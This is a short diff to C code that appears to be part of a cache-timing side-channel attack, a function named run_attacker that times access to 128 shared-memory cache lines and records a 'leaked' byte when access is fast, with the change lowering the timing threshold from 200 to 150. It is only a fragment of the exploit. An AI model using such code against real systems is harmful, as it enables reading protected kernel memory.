@@ -66,7 +66,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
        for (int cache_line = 0; cache_line < 128; cache_line++) {
 	       access_time = time_access(shared_memory + 4096*cache_line);
-               if (access_time < 200) {
+               if (access_time < 150) {
 		       
 		leaked_byte_array[rep] = (char) cache_line;
 		rep++;
